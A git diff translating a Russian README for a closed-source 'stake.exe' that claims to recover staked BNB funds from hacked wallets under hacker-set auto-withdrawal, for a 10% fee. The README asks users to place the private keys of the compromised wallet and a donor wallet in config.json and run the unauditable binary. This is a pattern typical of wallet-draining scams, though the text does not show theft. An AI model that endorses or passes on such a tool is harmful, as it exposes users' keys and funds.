@@ -1,26 +1,25 @@
 # [Читать на русском](https://github.com/hom9kfun/autowithdraw-bypass-bsc-stake/blob/main/README_RU.md)
 
-# 🛡️ Программа для Обхода Автовывода Средств из Взломанных Кошельков
+# 🛡️ Program for Bypassing Automatic Withdrawal of Funds from Hacked Wallets
 
-Эта программа поможет вам вывести свои средства из-под автовывода, который устанавливают хакеры на взломанных кошельках. Если вы пополняете средства для комиссии и они моментально выводятся на другой кошелек, не оставляя вам времени на действие — этот скрипт обходит подобные ситуации, взимая всего 10% от общей суммы вывода стейкинга. В дальнейшем, если программа будет пользоваться спросом, я планирую снижать комиссию вплоть до 1%.
+This program will help you withdraw your funds from the automatic withdrawal that hackers set up on hacked wallets. If you replenish funds for the commission and they are instantly withdrawn to another wallet, leaving you no time to act - this script bypasses such situations, charging only 10% of the total staking withdrawal amount. In the future, if the program is in demand, I plan to reduce the commission to 1%.
 
-## ⚙️ Подготовка к Работе
+## ⚙️ Getting Started
 
-### 1. Настройка `config.json`
+### 1. Setting up `config.json`
 
-Перед запуском программы, заполните файл `config.json` следующим образом:
+Before running the program, fill in the `config.json` file as follows:
 
-- **`private_key_account`**: Приватный ключ кошелька, с которого вы хотите вывести стейк.
-- **`private_key_donor`**: Приватный ключ кошелька донора, с которого будут списаны BNB для транзакций.
-- **`contract_stake_address`**: Контракт адрес, на котором лежит стейк (например, Pancake Pool).
-- **`contract_token_address`**: Контракт адрес токена, который лежит в стейке (например, CAKE Token).
-- **`recipient_address`**: Адрес получателя, на который будут выведены токены из стейкинга.
-- **`transfer_gas_price`**: Размер комиссии (в Gwei) для транзакции перевода токенов (по умолчанию: 1 Gwei).
-- **`stake_gas_price`**: Размер комиссии (в Gwei) для транзакции вывода стейка (по умолчанию: 1 Gwei).
-- **`stake_balance`**: Баланс вашего стейкинга в обычном формате (например, если у вас лежит 100 BUSD в стейкинге, укажите просто `100`. Если сумма ниже 1, укажите ее через точку, например, `0.523`).
+- **`private_key_account`**: The private key of the wallet from which you want to withdraw the stake.
+- **`private_key_donor`**: The private key of the donor wallet from which BNB will be debited for transactions.
+- **`contract_stake_address`**: The contract address where the stake is located (e.g. Pancake Pool).
+- **`contract_token_address`**: The contract address of the token that is in the stake (e.g. CAKE Token).
+- **`recipient_address`**: The recipient address to which the tokens from the stake will be withdrawn.
+- **`transfer_gas_price`**: Fee amount (in Gwei) for a token transfer transaction (default: 1 Gwei).
+- **`stake_gas_price`**: Fee amount (in Gwei) for a stake withdrawal transaction (default: 1 Gwei).
+- **`stake_balance`**: Your staking balance in the usual format (e.g. if you have 100 BUSD staked, just enter `100`. If the amount is less than 1, separate it with a dot, e.g. `0.523`).
 
-### Пример `config.json`:
-
+### Example `config.json`:
 ```json
 {
   "private_key_account": "ВашПриватныйКлюч",
@@ -34,25 +33,24 @@
 }
 ```
 
-### 🚀 Запуск
+### 🚀 Launch
 
-После заполнения файла `config.json`, вы можете запускать программу `stake.exe`. Если все параметры указаны верно, вы увидите свои средства на указанном кошельке. 🥳
+After filling in the `config.json` file, you can launch the `stake.exe` program. If all parameters are specified correctly, you will see your funds on the specified wallet. 🥳
 
-### 🔒 Безопасность использования
+### 🔒 Safety of use
 
-- **Проверка на VirusTotal**: Убедитесь в безопасности файла `stake.exe`, проверив его на [VirusTotal](https://www.virustotal.com/). 🔍
-- **Исходный код**: К сожалению, по понятным причинам исходный код программы не доступен. ❌
+- **VirusTotal check**: Make sure the `stake.exe` file is safe by checking it on [VirusTotal](https://www.virustotal.com/). 🔍
+- **Source code**: Unfortunately, for obvious reasons, the source code of the program is not available. ❌
 
-### 📞 Поддержка
+### 📞 Support
 
-Если программа не сработала для вашего случая или у вас возникли другие вопросы, не стесняйтесь писать мне в Telegram: [@lololo45353](https://t.me/lololo45353). Я постараюсь помочь вам! 💬
+If the program did not work for you or you have other questions, do not hesitate to write to me in Telegram: [@lololo45353](https://t.me/lololo45353). I will try to help you! 💬
 
-### 📅 Будущие обновления
+### 📅 Future updates
 
-- В ближайшее время я планирую выпустить программы для обхода автовывода **NFT** и обычных токенов. 🎉
-- Также будут добавлены другие **EVM сети**. Следите за обновлениями! 🔔
+- In the near future, I plan to release programs to bypass the automatic withdrawal of **NFT** and regular tokens. 🎉
+- Other **EVM networks** will also be added. Stay tuned! 🔔
 
-### ⚠️ Важно
+### ⚠️ Important
 
-Используйте программу на свой страх и риск. Автоматизация операций с криптовалютой всегда несет в себе риски потери средств. 🔥
-
+Use the program at your own risk. Automation of cryptocurrency transactions always carries the risk of losing funds. 🔥
